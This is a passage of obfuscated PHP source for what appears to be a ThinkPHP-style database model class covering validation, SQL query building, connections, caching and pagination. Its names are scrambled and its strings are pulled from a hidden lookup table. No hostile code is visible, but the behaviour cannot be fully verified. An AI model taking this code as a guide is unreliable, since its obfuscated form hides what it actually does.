$€†¸Ñ·„[313] => $€†¸Ñ·„[314], $€†¸Ñ·„[315] => $€†¸Ñ·„[316], $€†¸Ñ·„[317] => $€†¸Ñ·„[318], $€†¸Ñ·„[319] => $€†¸Ñ·„[320], $€†¸Ñ·„[294] => $€†¸Ñ·„[321], $€†¸Ñ·„[322] => $€†¸Ñ·„[323]); if (isset($Ğ›™ÄŸ[strtolower($ÈéÊÃ†¸)])) { $ÈéÊÃ†¸ = $Ğ›™ÄŸ[strtolower($ÈéÊÃ†¸)]; } return preg_match($ÈéÊÃ†¸, $ùÙ›Áç³) === 1; } private function autoOperation(&$ÑÏ˜„û, $‡ƒıÖõÇ) { $Ğİ¿ó¶ =& $_SERVER[¹àö™Ç¾]; if (!empty($this->options[$Ğİ¿ó¶[324]])) { $’ï¿ôê® = $this->options[$Ğİ¿ó¶[324]]; unset($this->options[$Ğİ¿ó¶[324]]); } elseif (!empty($this->_auto)) { $’ï¿ôê® = $this->_auto; } if (isset($’ï¿ôê®)) { foreach ($’ï¿ôê® as $ğÎÚèÈ) { if (empty($ğÎÚèÈ[2])) { $ğÎÚèÈ[2] = THINK_MODEL_INSERT; } if ($‡ƒıÖõÇ == $ğÎÚèÈ[2] || $ğÎÚèÈ[2] == THINK_MODEL_BOTH) { switch (trim($ğÎÚèÈ[3])) { case $Ğİ¿ó¶[325]: case $Ğİ¿ó¶[326]: $–Ôà‰êò = isset($ğÎÚèÈ[4]) ? (array) $ğÎÚèÈ[4] : array(); if (isset($ÑÏ˜„û[$ğÎÚèÈ[0]])) { array_unshift($–Ôà‰êò, $ÑÏ˜„û[$ğÎÚèÈ[0]]); } if ($Ğİ¿ó¶[325] == $ğÎÚèÈ[3]) { $ÑÏ˜„û[$ğÎÚèÈ[0]] = call_user_func_array($ğÎÚèÈ[1], $–Ôà‰êò); } else { $ÑÏ˜„û[$ğÎÚèÈ[0]] = call_user_func_array(array(&$this, $ğÎÚèÈ[1]), $–Ôà‰êò); } break; case $Ğİ¿ó¶[277]: $ÑÏ˜„û[$ğÎÚèÈ[0]] = $ÑÏ˜„û[$ğÎÚèÈ[1]]; break; case $Ğİ¿ó¶[327]: if ($Ğİ¿ó¶[22] === $ÑÏ˜„û[$ğÎÚèÈ[0]]) { unset($ÑÏ˜„û[$ğÎÚèÈ[0]]); } break; case $Ğİ¿ó¶[328]: default: $ÑÏ˜„û[$ğÎÚèÈ[0]] = $ğÎÚèÈ[1]; } if (!1 === $ÑÏ˜„û[$ğÎÚèÈ[0]]) { unset($ÑÏ˜„û[$ğÎÚèÈ[0]]); } } } } return $ÑÏ˜„û; } protected function autoValidation($œŠ¦ì‘Ö, $Ù›Ï©–Ï) { $Ğ‡¹¶´– =& $_SERVER[¹àö™Ç¾]; if (!empty($this->options[$Ğ‡¹¶´–[329]])) { $İÃø°Ã = $this->options[$Ğ‡¹¶´–[329]]; unset($this->options[$Ğ‡¹¶´–[329]]); } elseif (!empty($this->_validate)) { $İÃø°Ã = $this->_validate; } if (isset($İÃø°Ã)) { if ($this->patchValidate) { $this->error = array(); } foreach ($İÃø°Ã as $„‘ª£Šï => $²ä°™¾ï) { if (empty($²ä°™¾ï[5]) || $²ä°™¾ï[5] == THINK_MODEL_BOTH || $²ä°™¾ï[5] == $Ù›Ï©–Ï) { if (0 == strpos($²ä°™¾ï[2], $Ğ‡¹¶´–[330]) && strpos($²ä°™¾ï[2], $Ğ‡¹¶´–[331])) { $²ä°™¾ï[2] = think_lang(substr($²ä°™¾ï[2], 2, -1)); } $²ä°™¾ï[3] = isset($²ä°™¾ï[3]) ? $²ä°™¾ï[3] : THINK_EXISTS_VALIDATE; $²ä°™¾ï[4] = isset($²ä°™¾ï[4]) ? $²ä°™¾ï[4] : $Ğ‡¹¶´–[332]; switch ($²ä°™¾ï[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($œŠ¦ì‘Ö, $²ä°™¾ï)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Ğ‡¹¶´–[22] != trim($œŠ¦ì‘Ö[$²ä°™¾ï[0]])) { if (!1 === $this->_validationField($œŠ¦ì‘Ö, $²ä°™¾ï)) { return !1; } } break; default: if (isset($œŠ¦ì‘Ö[$²ä°™¾ï[0]])) { if (!1 === $this->_validationField($œŠ¦ì‘Ö, $²ä°™¾ï)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($¶Å¬Ş¥Ğ, $•À°ÎĞğ) { if (!1 === $this->_validationFieldItem($¶Å¬Ş¥Ğ, $•À°ÎĞğ)) { if ($this->patchValidate) { $this->error[$•À°ÎĞğ[0]] = $•À°ÎĞğ[2]; } else { $this->error = $•À°ÎĞğ[2]; return !1; } } return; } protected function _validationFieldItem($åœ¬Øğµ, $øÜ×ÁÓ·) { $ü÷âô¾Ÿ =& $_SERVER[¹àö™Ç¾]; switch (strtolower(trim($øÜ×ÁÓ·[4]))) { case $ü÷âô¾Ÿ[325]: case $ü÷âô¾Ÿ[326]: $’‡½½£İ = isset($øÜ×ÁÓ·[6]) ? (array) $øÜ×ÁÓ·[6] : array(); if (is_string($øÜ×ÁÓ·[0]) && strpos($øÜ×ÁÓ·[0], $ü÷âô¾Ÿ[60])) { $øÜ×ÁÓ·[0] = explode($ü÷âô¾Ÿ[60], $øÜ×ÁÓ·[0]); } if (is_array($øÜ×ÁÓ·[0])) { foreach ($øÜ×ÁÓ·[0] as $ŞªÁ¯œÙ) { $ÑøÒ·½[$ŞªÁ¯œÙ] = $åœ¬Øğµ[$ŞªÁ¯œÙ]; } array_unshift($’‡½½£İ, $ÑøÒ·½); } else { array_unshift($’‡½½£İ, $åœ¬Øğµ[$øÜ×ÁÓ·[0]]); } if ($ü÷âô¾Ÿ[325] == $øÜ×ÁÓ·[4]) { return call_user_func_array($øÜ×ÁÓ·[1], $’‡½½£İ); } else { return call_user_func_array(array(&$this, $øÜ×ÁÓ·[1]), $’‡½½£İ); } case $ü÷âô¾Ÿ[333]: return $åœ¬Øğµ[$øÜ×ÁÓ·[0]] == $åœ¬Øğµ[$øÜ×ÁÓ·[1]]; case $ü÷âô¾Ÿ[334]: if (is_string($øÜ×ÁÓ·[0]) && strpos($øÜ×ÁÓ·[0], $ü÷âô¾Ÿ[60])) { $øÜ×ÁÓ·[0] = explode($ü÷âô¾Ÿ[60], $øÜ×ÁÓ·[0]); } $š±Ò©©º = array(); if (is_array($øÜ×ÁÓ·[0])) { foreach ($øÜ×ÁÓ·[0] as $ŞªÁ¯œÙ) { $š±Ò©©º[$ŞªÁ¯œÙ] = $åœ¬Øğµ[$ŞªÁ¯œÙ]; } } else { $š±Ò©©º[$øÜ×ÁÓ·[0]] = $åœ¬Øğµ[$øÜ×ÁÓ·[0]]; } if (!empty($åœ¬Øğµ[$this->getPk()])) { $š±Ò©©º[$this->getPk()] = array($ü÷âô¾Ÿ[335], $åœ¬Øğµ[$this->getPk()]); } if ($this->where($š±Ò©©º)->find()) { return !1; } return !0; default: return $this->check($åœ¬Øğµ[$øÜ×ÁÓ·[0]], $øÜ×ÁÓ·[1], $øÜ×ÁÓ·[4]); } } public function check($˜©ÓòÛÇ, $ÏÕøî, $ÍùØ’ü = "\162\145\147\x65\170") { $äÓåÃ—Õ =& $_SERVER[¹àö™Ç¾]; $ÍùØ’ü = strtolower(trim($ÍùØ’ü)); switch ($ÍùØ’ü) { case $äÓåÃ—Õ[17]: case $äÓåÃ—Õ[336]: $³¥¥ëø¤ = is_array($ÏÕøî) ? $ÏÕøî : explode($äÓåÃ—Õ[60], $ÏÕøî); return $ÍùØ’ü == $äÓåÃ—Õ[17] ? in_array($˜©ÓòÛÇ, $³¥¥ëø¤) : !in_array($˜©ÓòÛÇ, $³¥¥ëø¤); case $äÓåÃ—Õ[337]: case $äÓåÃ—Õ[338]: if (is_array($ÏÕøî)) { $ğò½ø¨ = $ÏÕøî[0]; $ÍûÓ™Òã = $ÏÕøî[1]; } else { list($ğò½ø¨, $ÍûÓ™Òã) = explode($äÓåÃ—Õ[60], $ÏÕøî); } return $ÍùØ’ü == $äÓåÃ—Õ[337] ? $˜©ÓòÛÇ >= $ğò½ø¨ && $˜©ÓòÛÇ <= $ÍûÓ™Òã : $˜©ÓòÛÇ < $ğò½ø¨ || $˜©ÓòÛÇ > $ÍûÓ™Òã; case $äÓåÃ—Õ[339]: case $äÓåÃ—Õ[340]: return $ÍùØ’ü == $äÓåÃ—Õ[339] ? $˜©ÓòÛÇ == $ÏÕøî : $˜©ÓòÛÇ != $ÏÕøî; case $äÓåÃ—Õ[341]: $•˜ÏŠ—¹ = mb_strlen($˜©ÓòÛÇ, $äÓåÃ—Õ[342]); if (strpos($ÏÕøî, $äÓåÃ—Õ[60])) { list($ğò½ø¨, $ÍûÓ™Òã) = explode($äÓåÃ—Õ[60], $ÏÕøî); return $•˜ÏŠ—¹ >= $ğò½ø¨ && $•˜ÏŠ—¹ <= $ÍûÓ™Òã; } else { return $•˜ÏŠ—¹ == $ÏÕøî; } case $äÓåÃ—Õ[343]: list($ó•ºõ–Œ, $”‚ÍøŸ©) = explode($äÓåÃ—Õ[60], $ÏÕøî); if (!is_numeric($ó•ºõ–Œ)) { $ó•ºõ–Œ = strtotime($ó•ºõ–Œ); } if (!is_numeric($”‚ÍøŸ©)) { $”‚ÍøŸ© = strtotime($”‚ÍøŸ©); } return NOW_TIME >= $ó•ºõ–Œ && NOW_TIME <= $”‚ÍøŸ©; case $äÓåÃ—Õ[344]: return in_array(get_client_ip(), explode($äÓåÃ—Õ[60], $ÏÕøî)); case $äÓåÃ—Õ[345]: return !in_array(get_client_ip(), explode($äÓåÃ—Õ[60], $ÏÕøî)); case $äÓåÃ—Õ[332]: default: return $this->regex($˜©ÓòÛÇ, $ÏÕøî); } } public function query($ÀÎ‰ÄÃó, $ÈÄŞş¹‰ = false) { $«Ÿ¤øÁ° =& $_SERVER[¹àö™Ç¾]; if (!is_bool($ÈÄŞş¹‰) && !is_array($ÈÄŞş¹‰)) { $ÈÄŞş¹‰ = func_get_args(); array_shift($ÈÄŞş¹‰); } $ÀÎ‰ÄÃó = str_replace(array($«Ÿ¤øÁ°[11], $«Ÿ¤øÁ°[346]), $«Ÿ¤øÁ°[63], $ÀÎ‰ÄÃó); $ÀÎ‰ÄÃó = $this->parseSql($ÀÎ‰ÄÃó, $ÈÄŞş¹‰); return $this->db->query($ÀÎ‰ÄÃó); } public function execute($ğ©è¶ÕÓ, $†Š—…Ù˜ = false) { if (!is_bool($†Š—…Ù˜) && !is_array($†Š—…Ù˜)) { $†Š—…Ù˜ = func_get_args(); array_shift($†Š—…Ù˜); } $ğ©è¶ÕÓ = $this->parseSql($ğ©è¶ÕÓ, $†Š—…Ù˜); return $this->db->execute($ğ©è¶ÕÓ); } protected function parseSql($ê„¾½±Š, $£ÍÛ¸ÆÁ) { $ë°ó·¿Ã =& $_SERVER[¹àö™Ç¾]; if (!0 === $£ÍÛ¸ÆÁ) { $Ğ‘Ò¾“Æ = $this->_parseOptions(); $ê„¾½±Š = $this->db->parseSql($ê„¾½±Š, $Ğ‘Ò¾“Æ); } elseif (is_array($£ÍÛ¸ÆÁ)) { $£ÍÛ¸ÆÁ = array_map(array($this->db, $ë°ó·¿Ã[347]), $£ÍÛ¸ÆÁ); $ê„¾½±Š = vsprintf($ê„¾½±Š, $£ÍÛ¸ÆÁ); } else { $ê„¾½±Š = strtr($ê„¾½±Š, array($ë°ó·¿Ã[348] => $this->getTableName(), $ë°ó·¿Ã[349] => think_config($ë°ó·¿Ã[248]))); } $this->db->setModel($this->name); return $ê„¾½±Š; } public function db($Óà°îØ„ = '', $±ÔÉ¤¾é = '', $²Ö¬ø¿ = array()) { $ÇÕÃ¨°µ =& $_SERVER[¹àö™Ç¾]; if ($ÇÕÃ¨°µ[22] === $Óà°îØ„ && $this->db) { return $this->db; } static $¸éÇ•¡½ = array(); static $ ƒ©¥Â  = array(); if (!isset($ ƒ©¥Â [$Óà°îØ„]) || isset($ ƒ©¥Â [$Óà°îØ„]) && $±ÔÉ¤¾é && $¸éÇ•¡½[$Óà°îØ„] != $±ÔÉ¤¾é) { if (!empty($±ÔÉ¤¾é) && is_string($±ÔÉ¤¾é) && !1 === strpos($±ÔÉ¤¾é, $ÇÕÃ¨°µ[18])) { $±ÔÉ¤¾é = think_config($±ÔÉ¤¾é); } $Óà°îØ„ = think_guid($±ÔÉ¤¾é); $ ƒ©¥Â [$Óà°îØ„] = Db::getInstance($±ÔÉ¤¾é); } elseif (NULL === $±ÔÉ¤¾é) { $ ƒ©¥Â [$Óà°îØ„]->close(); unset($ ƒ©¥Â [$Óà°îØ„]); return; } if (!empty($²Ö¬ø¿)) { if (is_string($²Ö¬ø¿)) { parse_str($²Ö¬ø¿, $²Ö¬ø¿); } foreach ($²Ö¬ø¿ as $İŸüøãÀ => $…ïíÅ†·) { $this->setProperty($İŸüøãÀ, $…ïíÅ†·); } } $¸éÇ•¡½[$Óà°îØ„] = $±ÔÉ¤¾é; $this->db = $ ƒ©¥Â [$Óà°îØ„]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ºŒåô‘´ = get_class($this); if ($ºŒåô‘´ == $_SERVER[¹àö™Ç¾][350]) { return $this->name; } $this->name = substr($ºŒåô‘´, 0, -5); } return $this->name; } public function getTableName() { $»Èİé… =& $_SERVER[¹àö™Ç¾]; if (empty($this->trueTableName)) { $˜«™ƒÊº = !empty($this->tablePrefix) ? $this->tablePrefix : $»Èİé…[22]; if (!empty($this->tableName)) { $˜«™ƒÊº .= $this->tableName; } else { $˜«™ƒÊº .= think_parse_name($this->name); } $this->trueTableName = strtolower($˜«™ƒÊº); } return (!empty($this->dbName) ? $this->dbName . $»Èİé…[20] : $»Èİé…[22]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $œ°¢¿Î« =& $_SERVER[¹àö™Ç¾]; return isset($this->fields[$œ°¢¿Î«[255]]) ? $this->fields[$œ°¢¿Î«[255]] : $this->pk; } public function getDbFields() { $ëØØ« =& $_SERVER[¹àö™Ç¾]; if (isset($this->options[$ëØØ«[283]])) { $ôíËŒ¨³ = $this->db->getFields($this->options[$ëØØ«[283]]); return $ôíËŒ¨³ ? array_keys($ôíËŒ¨³) : !1; } if ($this->fields) { $ôíËŒ¨³ = $this->fields; unset($ôíËŒ¨³[$ëØØ«[254]], $ôíËŒ¨³[$ëØØ«[255]], $ôíËŒ¨³[$ëØØ«[256]], $ôíËŒ¨³[$ëØØ«[253]]); return $ôíËŒ¨³; } return !1; } public function data($¹Ğ´Ë‹ = '') { $¨ú£Ï‡ =& $_SERVER[¹àö™Ç¾]; if ($¨ú£Ï‡[22] === $¹Ğ´Ë‹ && !empty($this->data)) { return $this->data; } if (is_object($¹Ğ´Ë‹)) { $¹Ğ´Ë‹ = get_object_vars($¹Ğ´Ë‹); } elseif (is_string($¹Ğ´Ë‹)) { parse_str($¹Ğ´Ë‹, $¹Ğ´Ë‹); } elseif (!is_array($¹Ğ´Ë‹)) { think_exception(think_lang($¨ú£Ï‡[275])); } $this->data = $¹Ğ´Ë‹; return $this; } public function join($ËĞ®¤âø) { $ÁŸ¤¥ =& $_SERVER[¹àö™Ç¾]; if (is_array($ËĞ®¤âø)) { $this->options[$ÁŸ¤¥[286]] = $ËĞ®¤âø; } elseif (!empty($ËĞ®¤âø)) { $this->options[$ÁŸ¤¥[286]][] = $ËĞ®¤âø; } return $this; } public function union($‘‘Å¶¢¿, $Êì‹åºÃ = false) { $ÆĞÌ¼ÊŸ =& $_SERVER[¹àö™Ç¾]; if (empty($‘‘Å¶¢¿)) { return $this; } if ($Êì‹åºÃ) { $this->options[$ÆĞÌ¼ÊŸ[351]][$ÆĞÌ¼ÊŸ[352]] = !0; } if (is_object($‘‘Å¶¢¿)) { $‘‘Å¶¢¿ = get_object_vars($‘‘Å¶¢¿); } if (is_string($‘‘Å¶¢¿)) { $Œ„Ûûïï = $‘‘Å¶¢¿; } elseif (is_array($‘‘Å¶¢¿)) { if (isset($‘‘Å¶¢¿[0])) { $this->options[$ÆĞÌ¼ÊŸ[351]] = array_merge($this->options[$ÆĞÌ¼ÊŸ[351]], $‘‘Å¶¢¿); return $this; } else { $Œ„Ûûïï = $‘‘Å¶¢¿; } } else { think_exception(think_lang($ÆĞÌ¼ÊŸ[275])); } $this->options[$ÆĞÌ¼ÊŸ[351]][] = $Œ„Ûûïï; return $this; } public function cache($ˆ©œÍí = true, $®¨×êîÓ = null, $Îï£œÑÖ = '') { $˜Ó¨´æ¦ =& $_SERVER[¹àö™Ç¾]; if (!1 !== $ˆ©œÍí) { $this->options[$˜Ó¨´æ¦[353]] = array($˜Ó¨´æ¦[105] => $ˆ©œÍí, $˜Ó¨´æ¦[343] => $®¨×êîÓ, $˜Ó¨´æ¦[43] => $Îï£œÑÖ); } return $this; } public function field($ªáç¿ïÍ, $‘§ÙÒ… = false) { $ş‘ÖÈ×° =& $_SERVER[¹àö™Ç¾]; if (!0 === $ªáç¿ïÍ) { $Í°¥°¡ = $this->getDbFields(); $ªáç¿ïÍ = $Í°¥°¡ ? $Í°¥°¡ : $ş‘ÖÈ×°[191]; } elseif ($‘§ÙÒ…) { if (is_string($ªáç¿ïÍ)) { $ªáç¿ïÍ = explode($ş‘ÖÈ×°[60], $ªáç¿ïÍ); } $Í°¥°¡ = $this->getDbFields(); $ªáç¿ïÍ = $Í°¥°¡ ? array_diff($Í°¥°¡, $ªáç¿ïÍ) : $ªáç¿ïÍ; } $this->options[$ş‘ÖÈ×°[277]] = $ªáç¿ïÍ; return $this; } public function scope($Ÿâˆ½§ö = '', $şü¦Çëè = NULL) { $ñŒË¾û„ =& $_SERVER[¹àö™Ç¾]; if ($ñŒË¾û„[22] === $Ÿâˆ½§ö) { if (isset($this->_scope[$ñŒË¾û„[47]])) { $Í¢òÉ€° = $this->_scope[$ñŒË¾û„[47]]; } else { return $this; } } elseif (is_string($Ÿâˆ½§ö)) { $²¢¿³¹à = explode($ñŒË¾û„[60], $Ÿâˆ½§ö); $Í¢òÉ€° = array(); foreach ($²¢¿³¹à as $ı¶ú„³Œ) { if (!isset($this->_scope[$ı¶ú„³Œ])) { continue; } $Í¢òÉ€° = array_merge($Í¢òÉ€°, $this->_scope[$ı¶ú„³Œ]); } if (!empty($şü¦Çëè) && is_array($şü¦Çëè)) { $Í¢òÉ€° = array_merge($Í¢òÉ€°, $şü¦Çëè); } } elseif (is_array($Ÿâˆ½§ö)) { $Í¢òÉ€° = $Ÿâˆ½§ö; } if (is_array($Í¢òÉ€°) && !empty($Í¢òÉ€°)) { $this->options = array_merge($this->options, array_change_key_case($Í¢òÉ€°)); } return $this; } public function where($Î¡õ†ĞÃ, $œ¼‰éé¿ = null) { $øë’—×œ =& $_SERVER[¹àö™Ç¾]; if (!is_null($œ¼‰éé¿) && is_string($Î¡õ†ĞÃ)) { if (!is_array($œ¼‰éé¿)) { $œ¼‰éé¿ = func_get_args(); array_shift($œ¼‰éé¿); } $œ¼‰éé¿ = array_map(array($this->db, $øë’—×œ[347]), $œ¼‰éé¿); $Î¡õ†ĞÃ = vsprintf($Î¡õ†ĞÃ, $œ¼‰éé¿); } elseif (is_object($Î¡õ†ĞÃ)) { $Î¡õ†ĞÃ = get_object_vars($Î¡õ†ĞÃ); } elseif (is_array($Î¡õ†ĞÃ)) { foreach ($Î¡õ†ĞÃ as $âÓ®ï§ => $‡ƒ‰Ñõ) { if ((is_numeric($âÓ®ï§) || !$âÓ®ï§) && is_string($‡ƒ‰Ñõ)) { if (strpos($‡ƒ‰Ñõ, $øë’—×œ[354]) === 0) { continue; } think_trace($øë’—×œ[355], $øë’—×œ[22], $øë’—×œ[59]); die; } } } if (is_string($Î¡õ†ĞÃ) && $øë’—×œ[22] != $Î¡õ†ĞÃ) { $ßêëÁƒ¬ = array(); $ßêëÁƒ¬[$øë’—×œ[356]] = $Î¡õ†ĞÃ; $Î¡õ†ĞÃ = $ßêëÁƒ¬; } if (isset($this->options[$øë’—×œ[279]])) { $this->options[$øë’—×œ[279]] = array_merge($this->options[$øë’—×œ[279]], $Î¡õ†ĞÃ); } else { $this->options[$øë’—×œ[279]] = $Î¡õ†ĞÃ; } return $this; } public function limit($ƒıáŠèî, $•ı‡Ç¿Ä = null) { $¡ıµ¦±„ =& $_SERVER[¹àö™Ç¾]; $this->options[$¡ıµ¦±„[296]] = is_null($•ı‡Ç¿Ä) ? $ƒıáŠèî : $ƒıáŠèî . $¡ıµ¦±„[60] . $•ı‡Ç¿Ä; return $this; } public function page($ÛÉÂ…Ê’, $­°—¬Îô = null) { $âä®‰®Ù =& $_SERVER[¹àö™Ç¾]; $this->options[$âä®‰®Ù[357]] = is_null($­°—¬Îô) ? $ÛÉÂ…Ê’ : $ÛÉÂ…Ê’ . $âä®‰®Ù[60] . $­°—¬Îô; return $this; } public function comment($ø÷´ùÛ) { $this->options[$_SERVER[¹àö™Ç¾][358]] = $ø÷´ùÛ; return $this; } public function setProperty($¯Ì—¹ò¿, $÷ßŒ“Ï‹) { if (property_exists($this, $¯Ì—¹ò¿)) { $this->{$¯Ì—¹ò¿} = $÷ßŒ“Ï‹; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\x79\x54\151\x6d\x65", "\164\151\x6d\145", "\151\x6e\163\x65\162\164\54\x75\x70\144\141\x74\x65", "\x66\165\156\x63\x74\151\157\156"), array("\x63\x72\145\x61\164\x65\124\x69\155\x65", "\164\151\x6d\x65", "\x69\156\163\145\162\164", "\x66\165\x6e\x63\164\x69\157\x6e")); public function setDataAuto($Ñğ²ë æ) { $this->dataAuto = $Ñğ²ë æ; } public function __construct($Äô›…¥ = '', $ô•ê‚‚£ = '', $âæğ Ø… = '') { parent::__construct($Äô›…¥, $ô•ê‚‚£, $âæğ Ø…); } protected $tableMeta = array(); protected function _beforeInsert(&$øØªØãÓ, $¼ı•ºŒµ) { $ô“àè…Ø =& $_SERVER[¹àö™Ç¾]; if (!$this->checkDataAutoHas($ô“àè…Ø[359])) { return; } $this->dataBeforeFilter($øØªØãÓ, $ô“àè…Ø[359]); } protected function _beforeUpdate(&$·³¶ºû¦, $ñãÌÎì–) { $èéğ şß =& $_SERVER[¹àö™Ç¾]; if (!$this->checkDataAutoHas($èéğ şß[360])) { return; } $this->dataBeforeFilter($·³¶ºû¦, $èéğ şß[360]); } protected function _afterSelect(&$–¸Æùà…, $ÀÀü÷ƒí) { if (!is_array($–¸Æùà…)) { return; } if (!$this->checkDataAutoHas($_SERVER[¹àö™Ç¾][361])) { return; } foreach ($–¸Æùà… as &$ú—ÂÑ¦‚) { $this->dataAfterFilter($ú—ÂÑ¦‚); } unset($ú—ÂÑ¦‚); } protected function _afterFind(&$´Àƒ®¥Í, $ ‹ñû¦ò) { if (!is_array($´Àƒ®¥Í)) { return; } if (!$this->checkDataAutoHas($_SERVER[¹àö™Ç¾][361])) { return; } $this->dataAfterFilter($´Àƒ®¥Í); } public static function textEncode($†‹Ú”ÎÀ) { if (!$†‹Ú”ÎÀ) { return $†‹Ú”ÎÀ; } $€à¨ÅşÜ = json_encode($†‹Ú”ÎÀ); $€à¨ÅşÜ = preg_replace_callback($_SERVER[¹àö™Ç¾][362], function ($õÊáÆã™) { return addslashes($õÊáÆã™[0]); }, $€à¨ÅşÜ); return json_decode($€à¨ÅşÜ); } public static function textDecode($óúœøçŠ) { $šÌûú¶  =& $_SERVER[¹àö™Ç¾]; $¶æ®û’ = json_encode($óúœøçŠ); $¶æ®û’ = preg_replace_callback($šÌûú¶ [363], function ($³µô©Ä) { return $_SERVER[¹àö™Ç¾][108]; }, $¶æ®û’); return json_decode($¶æ®û’); } public function setAutoIncrement($›Ëì ·å) { $ˆˆıˆò± = array($this->getPk() => $›Ëì ·å); $ŒŠø¹†ü = $this->data($ˆˆıˆò±)->add(); if ($ŒŠø¹†ü) { $this->delete($ŒŠø¹†ü); } } public function getAutoIncrement() { $«Ûí™Âà = $this->getTableName(); $…ô¸ƒ¢¹ = $this->max($this->getPk()); $®¾«ÛÒ« = $this->query("\163\x68\x6f\167\x20\164\141\x62\154\145\x20\163\164\x61\x74\x75\163\x20\x77\150\145\x72\145\40\116\x61\155\x65\x3d\47{$«Ûí™Âà}\47"); $ÈÊóÀÀì = $®¾«ÛÒ«[0][$_SERVER[¹àö™Ç¾][364]]; $”ıÛöÀ = max($…ô¸ƒ¢¹, $ÈÊóÀÀì); return $”ıÛöÀ; } protected function _callBefore($ÒìİñÛ–, $á‘—ŠÚö) { return $this->cacheCallCheck($ÒìİñÛ–, $á‘—ŠÚö, !1); } protected function _callAfter($—è¡æø£, $óÌ…‘ô) { return $this->cacheCallCheck($—è¡æø£, $óÌ…‘ô, !0); } protected function cacheFunctionAlias($ƒôĞ»›‘) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($²¡ï¸ªÎ, $ ¾ßüâã, $ºÈáš¡ = false) { $Øø¸å’™ = $this->cacheFunctionAlias($ ¾ßüâã); if (!$Øø¸å’™) { return; } foreach ($Øø¸å’™ as $éôœñÍ‰ => $©åÁÏ…) { $ÛŠõ§‡ë = $©åÁÏ…[0]; $Éõ°Çø = explode($_SERVER[¹àö™Ç¾][60], $©åÁÏ…[1]); if ($²¡ï¸ªÎ == $éôœñÍ‰) { return $this->cacheFunctionGet($éôœñÍ‰, $ÛŠõ§‡ë); } if ($ºÈáš¡ && in_array($²¡ï¸ªÎ, $Éõ°Çø)) { $this->cacheFunctionClear($éôœñÍ‰, $ÛŠõ§‡ë); } } } public function cacheFunctionGet($ğ¤…Œ¡Ï, $«½®ÔíÛ) { $ĞœÆ¦ê‹ = $this->cacheKeyMake($ğ¤…Œ¡Ï, $«½®ÔíÛ); $á¨âÂí› = Cache::get($ĞœÆ¦ê‹); if (!is_array($á¨âÂí›)) { $á¨âÂí› = call_user_func_array(array($this, $ğ¤…Œ¡Ï), array($«½®ÔíÛ, !0)); Cache::set($ĞœÆ¦ê‹, $á¨âÂí›); } return $á¨âÂí›; } public function cacheFunctionClear($ÁòÎîá, $´Ëìå¦) { $óŠêä”ß = $´Ëìå¦; if (!is_array($´Ëìå¦)) { $óŠêä”ß = array($´Ëìå¦); } foreach ($óŠêä”ß as $¤¨„™ë³) { $î•şò… = $this->cacheKeyMake($ÁòÎîá, $¤¨„™ë³); Cache::remove($î•şò…); } } private function cacheKeyMake($¡¦è„÷, $›ôŞåâÕ) { $ í•˜à =& $_SERVER[¹àö™Ç¾]; return get_class($this) . $ í•˜à[21] . $¡¦è„÷ . $ í•˜à[365] . $›ôŞåâÕ; } protected function selectPageReset() { $ô€÷Œ™™ =& $_SERVER[¹àö™Ç¾]; if (isset($GLOBALS[$ô€÷Œ™™[366]])) { return; } $GLOBALS[$ô€÷Œ™™[366]] = isset($GLOBALS[$ô€÷Œ™™[17]][$ô€÷Œ™™[367]]) ? $GLOBALS[$ô€÷Œ™™[17]][$ô€÷Œ™™[367]] : !1; $GLOBALS[$ô€÷Œ™™[368]] = isset($GLOBALS[$ô€÷Œ™™[17]][$ô€÷Œ™™[357]]) ? $GLOBALS[$ô€÷Œ™™[17]][$ô€÷Œ™™[357]] : !1; $GLOBALS[$ô€÷Œ™™[17]][$ô€÷Œ™™[367]] = !1; $GLOBALS[$ô€÷Œ™™[17]][$ô€÷Œ™™[357]] = !1; } protected function selectPageRestore() { $ˆº°Ë§Û =& $_SERVER[¹àö™Ç¾]; if (!isset($GLOBALS[$ˆº°Ë§Û[366]])) { return; } $GLOBALS[$ˆº°Ë§Û[17]][$ˆº°Ë§Û[367]] = $GLOBALS[$ˆº°Ë§Û[366]]; $GLOBALS[$ˆº°Ë§Û[17]][$ˆº°Ë§Û[357]] = $GLOBALS[$ˆº°Ë§Û[368]]; if ($GLOBALS[$ˆº°Ë§Û[17]][$ˆº°Ë§Û[367]] === !1) { unset($GLOBALS[$ˆº°Ë§Û[17]][$ˆº°Ë§Û[367]]); } if ($GLOBALS[$ˆº°Ë§Û[17]][$ˆº°Ë§Û[357]] === !1) { unset($GLOBALS[$ˆº°Ë§Û[17]][$ˆº°Ë§Û[357]]); } unset($GLOBALS[$ˆº°Ë§Û[366]]); unset($GLOBALS[$ˆº°Ë§Û[368]]); } protected function selectPage($ìÂèëŞ  = 200, $‘º¤÷öÒ = 1) { $·ñú‡çô =& $_SERVER[¹àö™Ç¾]; global $in; $”ßñôäÂ = $this->optionsValue(); $ €°¦óœ = 50000; $ìÂèëŞ  = isset($in[$·ñú‡çô[367]]) && $in[$·ñú‡çô[367]] ? $in[$·ñú‡çô[367]] : $ìÂèëŞ ; if ($ìÂèëŞ  === -1) { $in[$·ñú‡çô[367]] = !1; $ €°¦óœ = 100000000; $ìÂèëŞ  = $ €°¦óœ; } $Ğ²¬¦† = $”ßñôäÂ; $Ğ²¬¦†[$·ñú‡çô[369]] = array(); $ìÂèëŞ  = intval($ìÂèëŞ ); $ìÂèëŞ  = $ìÂèëŞ  <= 5 ? 5 : ($ìÂèëŞ  >= $ €°¦óœ ? $ €°¦óœ : $ìÂèëŞ ); $‘º¤÷öÒ = intval(isset($in[$·ñú‡çô[357]]) && $in[$·ñú‡çô[357]] ? $in[$·ñú‡çô[357]] : $‘º¤÷öÒ); $‘º¤÷öÒ = 